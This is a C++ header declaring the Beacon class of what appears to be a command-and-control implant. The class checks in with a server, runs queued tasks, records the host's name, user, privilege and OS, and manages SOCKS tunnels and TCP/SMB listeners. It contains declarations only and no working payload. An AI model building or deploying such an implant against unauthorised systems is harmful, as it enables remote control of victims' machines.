#pragma once

#ifdef __linux__
#elif _WIN32
#include <Windows.h>
#endif

#include <iostream>
#include <chrono>
#include <queue>
#include <mutex>

#include "SocksTunnelClient.hpp"
#include "Common.hpp"

#include "../listener/ListenerTcp.hpp"
#include "../listener/ListenerSmb.hpp"


class Beacon
{
public:
	Beacon(const std::string& ip, int port);
	virtual ~Beacon(){};

	virtual void  checkIn() = 0;
	bool runTasks();
	void sleep();

protected:
	bool execInstruction(C2Message& c2Message, C2Message& c2RetMessage);
	bool cmdToTasks(const std::string& input);
	bool taskResultsToCmd(std::string& output);

	std::string m_ip;
	int m_port;

	int m_aliveTimerMs;

	std::string m_beaconHash;
	std::string m_hostname;
	std::string m_username;
	std::string m_arch;
	std::string m_privilege;
	std::string m_os;

	std::queue<C2Message> m_tasks;
	std::queue<C2Message> m_taskResult;

private:
	std::string m_key;
	std::vector<std::unique_ptr<ModuleCmd>> m_moduleCmd;
	std::vector<std::unique_ptr<Listener>> m_listeners;
	std::vector<std::unique_ptr<SocksTunnelClient>> m_socksTunnelClient;

};
